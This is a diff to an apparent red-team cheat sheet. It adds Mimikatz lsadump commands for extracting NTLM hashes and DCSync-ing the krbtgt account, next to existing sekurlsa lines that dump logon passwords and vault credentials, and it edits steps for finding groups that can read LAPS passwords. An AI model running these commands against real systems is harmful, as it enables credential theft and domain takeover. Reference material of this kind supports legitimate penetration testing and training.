@@ -6,6 +6,9 @@
 privilege::debug
 token::elevate
 
+lsadump::lsa /inject /name:<user>    //NTLM hash of user
+lsadump::dcsync /user:krbtgt         //Hashes of specified user
+
 sekurlsa::logonpasswords //NTLM and SHA1 hashes
 sekurlsa::credman        //vault credentials
 sekurlsa::ekeys /aes128
@@ -178,11 +181,11 @@ Check available commands in PowerShell
 Get-Command *AdmPwd*
 ```
 
-Find groups allowed to interact with LAPS
+Find groups allowed to interact with LAPS. If command run with a wildcard argument throws an exception after returning one or more values call the command again but this time specify as identity parameter one of the OUs obtained the first time
 
 ```
 Find-AdmPwdExtendedRights -Identity *
-Find-AdmPwdExtendedRights -Identity <user>
+Find-AdmPwdExtendedRights -Identity <OU>
 ```
 
 Get users of the detected group
